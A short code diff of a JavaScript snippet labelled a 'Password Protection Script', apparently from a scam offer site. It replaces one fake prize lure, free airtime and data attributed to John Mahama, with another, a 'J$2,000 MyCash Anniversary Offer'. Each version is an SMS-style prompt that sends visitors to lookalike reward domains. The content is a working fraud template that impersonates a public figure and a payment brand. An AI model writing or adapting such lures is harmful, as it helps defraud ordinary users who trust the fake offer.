@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'CLAIM J$2,000'
+password=prompt('SMS: Congratulations Your MyCash Account is Eligible to receive J$2,000 MyCash Anniversary Offer, Kindly Press OK to PROCEED  ','CLAIM J$2,000');
+if (password != 'CLAIM J$2,000') {
+location.href='https://mycash-reward.alloffers.org/gift';
 }
